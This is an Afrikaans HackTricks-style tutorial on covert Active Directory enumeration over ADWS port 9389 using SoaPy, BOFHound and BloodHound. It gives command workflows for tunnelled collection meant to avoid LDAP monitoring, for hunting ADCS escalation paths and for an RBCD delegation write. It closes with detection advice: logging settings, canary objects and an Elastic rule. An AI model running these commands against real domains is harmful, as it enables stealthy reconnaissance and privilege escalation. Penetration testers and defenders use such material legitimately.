# Aktiewe Katalogus Webdienste (ADWS) Enumerasie & Stealth Versameling

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Aktiewe Katalogus Webdienste (ADWS) is **standaard geaktiveer op elke Domeinbeheerder sedert Windows Server 2008 R2** en luister op TCP **9389**. Ten spyte van die naam, **is daar geen HTTP betrokke nie**. In plaas daarvan, stel die diens LDAP-styl data bloot deur 'n stapel van eiendoms .NET raamwerk protokolle:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer binne hierdie binêre SOAP rame ingekapsuleer is en oor 'n ongewone poort reis, **is enumerasie deur ADWS baie minder waarskynlik om ondersoek, gefiltreer of gesigel te word as klassieke LDAP/389 & 636 verkeer**. Vir operateurs beteken dit:

* Stealthier rekognisie – Blou span konsentreer dikwels op LDAP vrae.
* Vryheid om te versamel van **nie-Windows gasheer (Linux, macOS)** deur 9389/TCP deur 'n SOCKS-proxy te tonnel.
* Dieselfde data wat jy via LDAP sou verkry (gebruikers, groepe, ACLs, skema, ens.) en die vermoë om **skrywe** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

> LET WEL: ADWS word ook deur baie RSAT GUI/PowerShell gereedskap gebruik, so verkeer mag meng met wettige administratiewe aktiwiteite.

## SoaPy – Inheemse Python Kliënt

[SoaPy](https://github.com/logangoins/soapy) is 'n **volledige herimplementering van die ADWS protokol stapel in suiwer Python**. Dit vervaardig die NBFX/NBFSE/NNS/NMF rame byte-vir-byte, wat versameling van Unix-agtige stelsels moontlik maak sonder om die .NET runtime te raak.

### Sleutelkenmerke

* Ondersteun **proxying deur SOCKS** (nuttig vanaf C2 implante).
* Fyn-gegradeerde soekfilters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **skryf** operasies ( `--set` / `--delete` ).
* **BOFHound uitvoermodus** vir direkte opname in BloodHound.
* `--parse` vlag om tydstempels / `userAccountControl` te verfraai wanneer menslike leesbaarheid vereis word.

### Installasie (operateur gasheer)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Die volgende werksvloei toon hoe om **domein & ADCS-objekte** oor ADWS te enumerate, dit na BloodHound JSON om te skakel en jag te maak vir sertifikaat-gebaseerde aanvalspaaie – alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teiken netwerk na jou boks (bv. via Chisel, Meterpreter, SSH dinamiese poort-voorwaarts, ens.).  Eksporteer `export HTTPS_PROXY=socks5://127.0.0.1:1080` of gebruik SoaPy se `--proxyHost/--proxyPort`.

2. **Versamel die worteldomein objek:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekte van die Konfigurasie NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Skakel oor na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP** op in die BloodHound GUI en voer cypher navrae soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat eskalasie paaie (ESC1, ESC8, ens.) te onthul.

### Skryf `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combineer dit met `s4u2proxy`/`Rubeus /getticket` vir 'n volledige **Resource-Based Constrained Delegation** ketting.

## Opsporing & Versterking

### Verbose ADDS Logging

Aktiveer die volgende register sleutels op Domein Beheerders om duur / ondoeltreffende soektogte wat van ADWS (en LDAP) kom, te vertoon:
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Events sal verskyn onder **Directory-Service** met die volle LDAP-filter, selfs wanneer die navraag via ADWS aangekom het.

### SACL Canary Objects

1. Skep 'n dummy objek (bv. gedeaktiveerde gebruiker `CanaryUser`).
2. Voeg 'n **Audit** ACE by vir die _Everyone_ prinsiep, geauditeer op **ReadProperty**.
3. Wanneer 'n aanvaller `(servicePrincipalName=*)`, `(objectClass=user)` ens. uitvoer, stuur die DC **Event 4662** wat die werklike gebruiker SID bevat – selfs wanneer die versoek geproksieer of van ADWS afkomstig is.

Elastic voorafgeboude reël voorbeeld:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Tooling Summary

| Doel | Gereedskap | Aantekeninge |
|------|------------|--------------|
| ADWS enumerasie | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/schryf |
| BloodHound inname | [BOFHound](https://github.com/bohops/BOFHound) | Converteer SoaPy/ldapsearch logs |
| Sertifikaat kompromie | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproksie word |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
